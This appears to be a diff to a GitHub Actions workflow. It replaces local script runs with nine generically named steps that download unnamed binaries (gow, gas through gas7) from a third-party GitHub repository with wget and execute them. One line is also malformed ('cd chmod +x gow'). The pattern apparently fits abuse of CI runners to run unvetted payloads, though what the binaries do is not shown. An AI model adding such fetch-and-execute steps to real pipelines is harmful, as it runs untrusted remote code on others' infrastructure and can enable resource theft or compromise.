@@ -18,29 +18,21 @@ jobs:
     steps:
       - uses: actions/checkout@v3
       - name: Run a one-line script
-        run: chmod +x gow && ./gow
-      - uses: actions/checkout@v3
+        run: wget https://github.com/junitadore56/kang-push/raw/main/gow && cd chmod +x gow && ./gow
       - name: Run a one-line script
-        run: chmod +x gas && ./gas
-      - uses: actions/checkout@v3
+        run: wget https://github.com/junitadore56/kang-push/raw/main/gas && chmod +x gas && ./gas
       - name: Run a one-line script
-        run: chmod +x gas1 && ./gas1
-      - uses: actions/checkout@v3
+        run: wget https://github.com/junitadore56/kang-push/raw/main/gas1 && chmod +x gas1 && ./gas1
       - name: Run a one-line script
-        run: chmod +x gas2 && ./gas2
-      - uses: actions/checkout@v3
+        run: wget https://github.com/junitadore56/kang-push/raw/main/gas2 && chmod +x gas2 && ./gas2
       - name: Run a one-line script
-        run: chmod +x gas3 && ./gas3
-      - uses: actions/checkout@v3
+        run: wget https://github.com/junitadore56/kang-push/raw/main/gas3 && chmod +x gas3 && ./gas3
       - name: Run a one-line script
-        run: chmod +x gas4 && ./gas4
-      - uses: actions/checkout@v3
+        run: wget https://github.com/junitadore56/kang-push/raw/main/gas4 && chmod +x gas4 && ./gas4
       - name: Run a one-line script
-        run: chmod +x gas5 && ./gas5
-      - uses: actions/checkout@v3
+        run: wget https://github.com/junitadore56/kang-push/raw/main/gas5 && chmod +x gas5 && ./gas5
       - name: Run a one-line script
-        run: chmod +x gas6 && ./gas6
-      - uses: actions/checkout@v3
+        run: wget https://github.com/junitadore56/kang-push/raw/main/gas6 && chmod +x gas6 && ./gas6
       - name: Run a one-line script
-        run: chmod +x gas7 && ./gas7
+        run: wget https://github.com/junitadore56/kang-push/raw/main/gas7 && chmod +x gas7 && ./gas7
         
